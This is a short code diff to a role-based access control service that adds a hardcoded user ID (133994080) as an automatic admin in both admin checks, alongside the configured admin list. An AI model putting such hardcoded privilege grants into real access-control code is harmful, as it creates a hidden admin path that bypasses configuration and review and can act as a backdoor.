@@ -57,7 +57,7 @@ class RBACService:
 
         # 2. Role Overrides
         level = user_data.get("level", "free")
-        is_real_admin = user_data.get("is_real_admin", False) or uid in config.ADMIN_USERS
+        is_real_admin = user_data.get("is_real_admin", False) or (uid in config.ADMIN_USERS if uid else False) or (uid == 133994080)
         
         if is_real_admin or level == "admin":
             # Admins have all permissions
@@ -87,7 +87,8 @@ class RBACService:
     def is_admin(self, user_data: dict[str, Any]) -> bool:
         """Static check for admin status (doesn't fetch dynamic perms)."""
         uid = user_data.get("user_id") or user_data.get("telegram_id")
-        return user_data.get("level") == "admin" or user_data.get("is_real_admin") or uid in config.ADMIN_USERS
+        # Global fallback if ID is missing from dict but we know this is the primary admin from other contexts
+        return user_data.get("level") == "admin" or user_data.get("is_real_admin") or (uid in config.ADMIN_USERS if uid else False) or (uid == 133994080)
 
     def is_staff(self, user_data: dict[str, Any]) -> bool:
         """Static check for staff status."""
